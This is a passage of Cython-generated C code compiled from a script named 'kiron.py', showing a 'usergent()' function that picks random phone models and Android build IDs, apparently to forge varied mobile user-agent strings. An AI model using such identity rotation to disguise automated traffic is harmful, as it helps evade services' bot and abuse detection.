  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 4, __pyx_n_s_M3s)) __PYX_ERR(0, 336, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_M5_Lite);
  __Pyx_GIVEREF(__pyx_kp_s_M5_Lite);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 5, __pyx_kp_s_M5_Lite)) __PYX_ERR(0, 336, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_M6_Note);
  __Pyx_GIVEREF(__pyx_kp_s_M6_Note);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 6, __pyx_kp_s_M6_Note)) __PYX_ERR(0, 336, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_Magic);
  __Pyx_GIVEREF(__pyx_n_s_Magic);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 7, __pyx_n_s_Magic)) __PYX_ERR(0, 336, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Maimang_5);
  __Pyx_GIVEREF(__pyx_kp_s_Maimang_5);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 8, __pyx_kp_s_Maimang_5)) __PYX_ERR(0, 336, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Mate_10_Lite_Dual_SIM);
  __Pyx_GIVEREF(__pyx_kp_s_Mate_10_Lite_Dual_SIM);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 9, __pyx_kp_s_Mate_10_Lite_Dual_SIM)) __PYX_ERR(0, 336, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Mate_20_X_China);
  __Pyx_GIVEREF(__pyx_kp_s_Mate_20_X_China);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 10, __pyx_kp_s_Mate_20_X_China)) __PYX_ERR(0, 336, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Mate_8);
  __Pyx_GIVEREF(__pyx_kp_s_Mate_8);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 11, __pyx_kp_s_Mate_8)) __PYX_ERR(0, 336, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_MB526);
  __Pyx_GIVEREF(__pyx_n_s_MB526);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 12, __pyx_n_s_MB526)) __PYX_ERR(0, 336, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Medias_X);
  __Pyx_GIVEREF(__pyx_kp_s_Medias_X);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 13, __pyx_kp_s_Medias_X)) __PYX_ERR(0, 336, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_MI_2);
  __Pyx_GIVEREF(__pyx_kp_s_MI_2);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 14, __pyx_kp_s_MI_2)) __PYX_ERR(0, 336, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_MI_3W);
  __Pyx_GIVEREF(__pyx_kp_s_MI_3W);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 15, __pyx_kp_s_MI_3W)) __PYX_ERR(0, 336, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Mi_4_LTE);
  __Pyx_GIVEREF(__pyx_kp_s_Mi_4_LTE);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 16, __pyx_kp_s_Mi_4_LTE)) __PYX_ERR(0, 336, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_MI_4i);
  __Pyx_GIVEREF(__pyx_kp_s_MI_4i);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 17, __pyx_kp_s_MI_4i)) __PYX_ERR(0, 336, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_MI_5);
  __Pyx_GIVEREF(__pyx_kp_s_MI_5);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 18, __pyx_kp_s_MI_5)) __PYX_ERR(0, 336, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_MI_5X);
  __Pyx_GIVEREF(__pyx_kp_s_MI_5X);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 19, __pyx_kp_s_MI_5X)) __PYX_ERR(0, 336, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Mi_A1);
  __Pyx_GIVEREF(__pyx_kp_s_Mi_A1);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 20, __pyx_kp_s_Mi_A1)) __PYX_ERR(0, 336, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Mi_Max);
  __Pyx_GIVEREF(__pyx_kp_s_Mi_Max);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 21, __pyx_kp_s_Mi_Max)) __PYX_ERR(0, 336, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Mi_Max_2);
  __Pyx_GIVEREF(__pyx_kp_s_Mi_Max_2);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 22, __pyx_kp_s_Mi_Max_2)) __PYX_ERR(0, 336, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Mi_Mix_2);
  __Pyx_GIVEREF(__pyx_kp_s_Mi_Mix_2);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 23, __pyx_kp_s_Mi_Mix_2)) __PYX_ERR(0, 336, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_Milestone);
  __Pyx_GIVEREF(__pyx_n_s_Milestone);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 24, __pyx_n_s_Milestone)) __PYX_ERR(0, 336, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_Miracle);
  __Pyx_GIVEREF(__pyx_n_s_Miracle);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 25, __pyx_n_s_Miracle)) __PYX_ERR(0, 336, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Moment_Sprint);
  __Pyx_GIVEREF(__pyx_kp_s_Moment_Sprint);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 26, __pyx_kp_s_Moment_Sprint)) __PYX_ERR(0, 336, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_Monza);
  __Pyx_GIVEREF(__pyx_n_s_Monza);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 27, __pyx_n_s_Monza)) __PYX_ERR(0, 336, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Motion_Plus);
  __Pyx_GIVEREF(__pyx_kp_s_Motion_Plus);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 28, __pyx_kp_s_Motion_Plus)) __PYX_ERR(0, 336, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Moto_C);
  __Pyx_GIVEREF(__pyx_kp_s_Moto_C);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 29, __pyx_kp_s_Moto_C)) __PYX_ERR(0, 336, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Moto_E2_4G_LTE);
  __Pyx_GIVEREF(__pyx_kp_s_Moto_E2_4G_LTE);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 30, __pyx_kp_s_Moto_E2_4G_LTE)) __PYX_ERR(0, 336, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Moto_E3_Power);
  __Pyx_GIVEREF(__pyx_kp_s_Moto_E3_Power);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 31, __pyx_kp_s_Moto_E3_Power)) __PYX_ERR(0, 336, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Moto_E4);
  __Pyx_GIVEREF(__pyx_kp_s_Moto_E4);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 32, __pyx_kp_s_Moto_E4)) __PYX_ERR(0, 336, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Moto_E4_Plus);
  __Pyx_GIVEREF(__pyx_kp_s_Moto_E4_Plus);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 33, __pyx_kp_s_Moto_E4_Plus)) __PYX_ERR(0, 336, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Moto_E5);
  __Pyx_GIVEREF(__pyx_kp_s_Moto_E5);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 34, __pyx_kp_s_Moto_E5)) __PYX_ERR(0, 336, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Moto_E5_Plus);
  __Pyx_GIVEREF(__pyx_kp_s_Moto_E5_Plus);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 35, __pyx_kp_s_Moto_E5_Plus)) __PYX_ERR(0, 336, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Moto_G);
  __Pyx_GIVEREF(__pyx_kp_s_Moto_G);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 36, __pyx_kp_s_Moto_G)) __PYX_ERR(0, 336, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Moto_G_2nd_Gen);
  __Pyx_GIVEREF(__pyx_kp_s_Moto_G_2nd_Gen);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 37, __pyx_kp_s_Moto_G_2nd_Gen)) __PYX_ERR(0, 336, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Moto_G_Play);
  __Pyx_GIVEREF(__pyx_kp_s_Moto_G_Play);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 38, __pyx_kp_s_Moto_G_Play)) __PYX_ERR(0, 336, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Moto_G3);
  __Pyx_GIVEREF(__pyx_kp_s_Moto_G3);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 39, __pyx_kp_s_Moto_G3)) __PYX_ERR(0, 336, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Moto_G3_Turbo_Edition);
  __Pyx_GIVEREF(__pyx_kp_s_Moto_G3_Turbo_Edition);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 40, __pyx_kp_s_Moto_G3_Turbo_Edition)) __PYX_ERR(0, 336, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Moto_G4);
  __Pyx_GIVEREF(__pyx_kp_s_Moto_G4);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 41, __pyx_kp_s_Moto_G4)) __PYX_ERR(0, 336, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Moto_G5_Plus);
  __Pyx_GIVEREF(__pyx_kp_s_Moto_G5_Plus);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 42, __pyx_kp_s_Moto_G5_Plus)) __PYX_ERR(0, 336, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Moto_G5s);
  __Pyx_GIVEREF(__pyx_kp_s_Moto_G5s);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 43, __pyx_kp_s_Moto_G5s)) __PYX_ERR(0, 336, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Moto_G5s_Plus);
  __Pyx_GIVEREF(__pyx_kp_s_Moto_G5s_Plus);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 44, __pyx_kp_s_Moto_G5s_Plus)) __PYX_ERR(0, 336, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Moto_G6);
  __Pyx_GIVEREF(__pyx_kp_s_Moto_G6);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 45, __pyx_kp_s_Moto_G6)) __PYX_ERR(0, 336, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Moto_X);
  __Pyx_GIVEREF(__pyx_kp_s_Moto_X);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 46, __pyx_kp_s_Moto_X)) __PYX_ERR(0, 336, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Moto_X_2nd_Gen_AT_T);
  __Pyx_GIVEREF(__pyx_kp_s_Moto_X_2nd_Gen_AT_T);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 47, __pyx_kp_s_Moto_X_2nd_Gen_AT_T)) __PYX_ERR(0, 336, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Moto_Z);
  __Pyx_GIVEREF(__pyx_kp_s_Moto_Z);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 48, __pyx_kp_s_Moto_Z)) __PYX_ERR(0, 336, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Multipad_2_Ultra_Duo_8_0_3G);
  __Pyx_GIVEREF(__pyx_kp_s_Multipad_2_Ultra_Duo_8_0_3G);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 49, __pyx_kp_s_Multipad_2_Ultra_Duo_8_0_3G)) __PYX_ERR(0, 336, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_MultiPhone_3350_Duo);
  __Pyx_GIVEREF(__pyx_kp_s_MultiPhone_3350_Duo);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 50, __pyx_kp_s_MultiPhone_3350_Duo)) __PYX_ERR(0, 336, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_MultiPhone_4044_Duo);
  __Pyx_GIVEREF(__pyx_kp_s_MultiPhone_4044_Duo);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 51, __pyx_kp_s_MultiPhone_4044_Duo)) __PYX_ERR(0, 336, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_MultiPhone_5504_DUO);
  __Pyx_GIVEREF(__pyx_kp_s_MultiPhone_5504_DUO);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 52, __pyx_kp_s_MultiPhone_5504_DUO)) __PYX_ERR(0, 336, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Multiphone_7600_Duo);
  __Pyx_GIVEREF(__pyx_kp_s_Multiphone_7600_Duo);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 53, __pyx_kp_s_Multiphone_7600_Duo)) __PYX_ERR(0, 336, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_MX2);
  __Pyx_GIVEREF(__pyx_n_s_MX2);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 54, __pyx_n_s_MX2)) __PYX_ERR(0, 336, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_MX380);
  __Pyx_GIVEREF(__pyx_n_s_MX380);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 55, __pyx_n_s_MX380)) __PYX_ERR(0, 336, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_MX5);
  __Pyx_GIVEREF(__pyx_n_s_MX5);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 56, __pyx_n_s_MX5)) __PYX_ERR(0, 336, __pyx_L1_error);
  __pyx_t_4 = NULL;
  __pyx_t_5 = 0;
  #if CYTHON_UNPACK_METHODS
  if (unlikely(PyMethod_Check(__pyx_t_3))) {
    __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_3);
    if (likely(__pyx_t_4)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
      __Pyx_INCREF(__pyx_t_4);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_3, function);
      __pyx_t_5 = 1;
    }
  }
  #endif
  {
    PyObject *__pyx_callargs[2] = {__pyx_t_4, __pyx_t_2};
    __pyx_t_1 = __Pyx_PyObject_FastCall(__pyx_t_3, __pyx_callargs+1-__pyx_t_5, 1+__pyx_t_5);
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 336, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  }
  __pyx_v_motorola = __pyx_t_1;
  __pyx_t_1 = 0;

  /* "kiron.py":337
 * def usergent():
 *      motorola= random.choice(['M Bot 54', 'M Bot 60', 'M1', 'M3', 'M3s', 'M5 Lite', 'M6 Note', 'Magic', 'Maimang 5', 'Mate 10 Lite Dual SIM', 'Mate 20 X (China)', 'Mate 8', 'MB526', 'Medias X', 'MI 2', 'MI 3W', 'Mi 4 LTE', 'MI 4i', 'MI 5', 'MI 5X', 'Mi A1', 'Mi Max', 'Mi Max 2', 'Mi Mix 2', 'Milestone', 'Miracle', 'Moment (Sprint)', 'Monza', 'Motion Plus', 'Moto C', 'Moto E2 (4G LTE)', 'Moto E3 Power', 'Moto E4', 'Moto E4 Plus', 'Moto E5', 'Moto E5 Plus', 'Moto G', 'Moto G 2nd Gen', 'Moto G Play', 'Moto G3', 'Moto G3 Turbo Edition', 'Moto G4', 'Moto G5 Plus', 'Moto G5s', 'Moto G5s Plus', 'Moto G6', 'Moto X', 'Moto X 2nd Gen (AT&T)', 'Moto Z', 'Multipad 2 Ultra Duo 8.0 3G', 'MultiPhone 3350 Duo', 'MultiPhone 4044 Duo', 'MultiPhone 5504 DUO', 'Multiphone 7600 Duo', 'MX2', 'MX380', 'MX5'])
 *      mmp = random.choice(['13 Pro','Black Shark','Black Shark 2','Black Shark 3','Black Shark 3S','Black Shark 4','Black Shark 4 Pro','Black Shark 5','Black Shark 5 Pro','Black Shark Helo','Civi','Civi 2','Hongmi','Hongmi 1S','Hongmi 2','Hongmi 2 3G','Hongmi 2 4G','Hongmi 4G','Hongmi Note 1TD','Mi Box 4','Mi Cancro','Mi CC 9','Mi CC 9 Pro','Mi CC 9e','Mi CC9','Mi Laser Projector 150','Mi Max','Mi Max 2','Mi Max 3','Mi MAX2','Mi Max3','Mi Mix','Mi Mix 2','Mi Mix 2S','Mi Mix 3','Mi Mix 3 5G','Mi Mix 4','Mi Mix Fold','Mi Note 10','Mi Note 10 Lite','Mi Note 10 Pro','Mi Note 11','Mi Note 2','Mi Note 3','Mi Note 8','Mi Note LTE','Mi Note Pro','Mi Note10','Mi Note5','Mi One','Mi One C1','Mi One Plus','Mi Pad','Mi Pad 2','Mi Pad 3','Mi Pad 4','Mi Pad 4 Plus','Mi Pad 5','Mi Pad 5 Pro','Mi Pad 5 Pro 5G','Mi Pad4','Mi Pad5','Mi Play','Mi XL','Mi5','MiTV 4A','MiTV 4A Pro','MiTV 4C','MiTV 4I','MiTV 4S','MiTV 4X','MiTV P1','MiTV Q1','MiTV Stick','MiTV Stick 4K','Mix Fold 2','MT6765 G Series','Note 12 Pro','Pad 6 Pro','Pocophone F1','Qin 1s+','Qin 2','Qin 2 Pro','Redmi 11','Redmi 12','Redmi 2','Redmi 3','Redmi 4','Redmi 5','Redmi 6','Redmi 7','Redmi 8','Redmi 9','Redmi A1','Redmi A2','Redmi A3','Redmi K30','Redmi K40','Redmi K50','Redmi K60','Redmi note','Redmi Note 1','Redmi Note 10Redmi Note 11','Redmi Note 12','Redmi Note 12T','Redmi Note 13','Redmi Note 15 Pro','Redmi Note 2','Redmi Note 3','Redmi Note 4','Redmi Note 5','Redmi Note 5 Pro','Redmi Note 6','Redmi Note 7','Redmi Note 7 Pro','Redmi Note 8 Pro','Redmi Note 8T','Redmi Note 9','Redmi Note 9 5G','Redmi Note 9 Pro','Redmi Note 9 Pro 5G','Redmi Note 9 Pro Max','Redmi Note 9S','Redmi Note 9T','Redmi Note 9T 5G','Redmi Note Prime','Redmi Note10','Redmi Note10T','Redmi Note7','Redmi Note8','Redmi Note8T','Redmi Note9','Redmi Pad','Redmi Pro','Redmi S2','Redmi X','Redmi Y1','Redmi Y1 Lite','Redmi Y2','Redmi Y3','Redmi 2', 'Redmi 3', 'Redmi 3S', 'Redmi 4', 'Redmi 4A', 'Redmi 4X', 'Redmi 5', 'Redmi 5 Plus', 'Redmi 5A', 'Redmi 6', 'Redmi Note', 'Redmi Note 3', 'Redmi Note 4', 'Redmi Note 4X', 'Redmi Note 5', 'Redmi Note 5 Pro', 'Redmi Note 5A', 'Redmi Note 5A Prime', 'Redmi S2', 'Redmi Y1', 'Redmi Y1 Lite', 'Redmi Y2', 'Rex 60', 'Rex 80', 'Rhyme', 'RM-560', 'Ruby'])             # <<<<<<<<<<<<<<
 *      mmm = random.choice(['Ruby', 'V10 (AT&T)', 'V10 (T-Mobile)', 'V10 (Verizon)', 'V1Max', 'V20', 'V20 (AT&T)', 'V20 (Sprint)', 'V20 (T-Mobile)', 'V20 (Verizon)', 'V3', 'V5', 'V5s', 'V7', 'V7 Plus', 'V808', 'V9', 'Valencia', 'Vdeo 2', 'Vega Iron 2 WiFi', 'Vibe K5', 'Vibe K5 Note', 'Vibe K5 Plus Dual SIM', 'Vibe X', 'Vibe Z', 'Vision', 'Vision 3 Dual SIM', 'Volt LS740', 'VR Bot 552', 'VX5500', 'Y21', 'Y21L', 'Y28', 'Y3 (2018)', 'Y336-U02', 'Y5 Dual SIM (2017)', 'Y5 II', 'Y5 Prime 2018 Dual SIM', 'Y51', 'Y51L', 'Y55L', 'Y6 (2018)', 'Y6 Dual SIM (2018)', 'Y6 Prime (2018)', 'Y65', 'Y66', 'Y69', 'Y71', 'Y81', 'Y83', 'Yota Phone 2', 'YP-GI1'])
 *      bbbb = random.choice(['PQ3B.190801.002', 'PQ1A.181205.002.A1', 'G950FXXU4DSBA', 'QKQ1.190910.002', 'G950FXXS5DSF1', 'G950FXXS8DTC6', 'G998USQU1ATCU', 'G985FXXU7DTJ2', 'N986BXXU1BTJ4', 'A525FXXU3AUG4', 'T970XXU3BUI7', 'F916BXXU1BTKF', 'N970FXXS8ETK4', 'G975USQU4ETG1', 'A715FXXU3ATI8', 'T500XXU3BUA8', 'OPM6.171019.030.K1', 'OPM2.171026.006.C1', 'TQ1A.230105.001.A3', 'SQ1A.211205.008', 'SD1A.210817.037.A1', 'RP1A.201005.004.A1', 'PQ1A.181205.006', 'N9F27L', 'PPR1.180610.011', 'PPR2.180905.006', 'QP1A.191105.003', 'RD1A.201105.003.C1', 'MMB29U', 'NDE63H', 'N4F26J', 'NMF27D', 'N4F26X', 'KOT49H', 'JWR66L', 'LMY48G', 'LMY48J', 'MDB08M', 'HLK75H', 'HLK75F', 'HRI83', 'HLK75C', 'EPE54B', 'G950FXXU3CRGH', 'G950FXXS6DTA1'])
 */
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_random); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 337, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_choice); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 337, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = PyList_New(167); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 337, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_INCREF(__pyx_kp_s_13_Pro);
  __Pyx_GIVEREF(__pyx_kp_s_13_Pro);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 0, __pyx_kp_s_13_Pro)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Black_Shark);
  __Pyx_GIVEREF(__pyx_kp_s_Black_Shark);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 1, __pyx_kp_s_Black_Shark)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Black_Shark_2);
  __Pyx_GIVEREF(__pyx_kp_s_Black_Shark_2);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 2, __pyx_kp_s_Black_Shark_2)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Black_Shark_3);
  __Pyx_GIVEREF(__pyx_kp_s_Black_Shark_3);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 3, __pyx_kp_s_Black_Shark_3)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Black_Shark_3S);
  __Pyx_GIVEREF(__pyx_kp_s_Black_Shark_3S);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 4, __pyx_kp_s_Black_Shark_3S)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Black_Shark_4);
  __Pyx_GIVEREF(__pyx_kp_s_Black_Shark_4);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 5, __pyx_kp_s_Black_Shark_4)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Black_Shark_4_Pro);
  __Pyx_GIVEREF(__pyx_kp_s_Black_Shark_4_Pro);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 6, __pyx_kp_s_Black_Shark_4_Pro)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Black_Shark_5);
  __Pyx_GIVEREF(__pyx_kp_s_Black_Shark_5);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 7, __pyx_kp_s_Black_Shark_5)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Black_Shark_5_Pro);
  __Pyx_GIVEREF(__pyx_kp_s_Black_Shark_5_Pro);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 8, __pyx_kp_s_Black_Shark_5_Pro)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Black_Shark_Helo);
  __Pyx_GIVEREF(__pyx_kp_s_Black_Shark_Helo);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 9, __pyx_kp_s_Black_Shark_Helo)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_Civi);
  __Pyx_GIVEREF(__pyx_n_s_Civi);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 10, __pyx_n_s_Civi)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Civi_2);
  __Pyx_GIVEREF(__pyx_kp_s_Civi_2);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 11, __pyx_kp_s_Civi_2)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_Hongmi);
  __Pyx_GIVEREF(__pyx_n_s_Hongmi);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 12, __pyx_n_s_Hongmi)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Hongmi_1S);
  __Pyx_GIVEREF(__pyx_kp_s_Hongmi_1S);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 13, __pyx_kp_s_Hongmi_1S)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Hongmi_2);
  __Pyx_GIVEREF(__pyx_kp_s_Hongmi_2);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 14, __pyx_kp_s_Hongmi_2)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Hongmi_2_3G);
  __Pyx_GIVEREF(__pyx_kp_s_Hongmi_2_3G);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 15, __pyx_kp_s_Hongmi_2_3G)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Hongmi_2_4G);
  __Pyx_GIVEREF(__pyx_kp_s_Hongmi_2_4G);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 16, __pyx_kp_s_Hongmi_2_4G)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Hongmi_4G);
  __Pyx_GIVEREF(__pyx_kp_s_Hongmi_4G);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 17, __pyx_kp_s_Hongmi_4G)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Hongmi_Note_1TD);
  __Pyx_GIVEREF(__pyx_kp_s_Hongmi_Note_1TD);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 18, __pyx_kp_s_Hongmi_Note_1TD)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Mi_Box_4);
  __Pyx_GIVEREF(__pyx_kp_s_Mi_Box_4);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 19, __pyx_kp_s_Mi_Box_4)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Mi_Cancro);
  __Pyx_GIVEREF(__pyx_kp_s_Mi_Cancro);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 20, __pyx_kp_s_Mi_Cancro)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Mi_CC_9);
  __Pyx_GIVEREF(__pyx_kp_s_Mi_CC_9);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 21, __pyx_kp_s_Mi_CC_9)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Mi_CC_9_Pro);
  __Pyx_GIVEREF(__pyx_kp_s_Mi_CC_9_Pro);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 22, __pyx_kp_s_Mi_CC_9_Pro)) __PYX_ERR(0, 337, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Mi_CC_9e);
  __Pyx_GIVEREF(__pyx_kp_s_Mi_CC_9e);
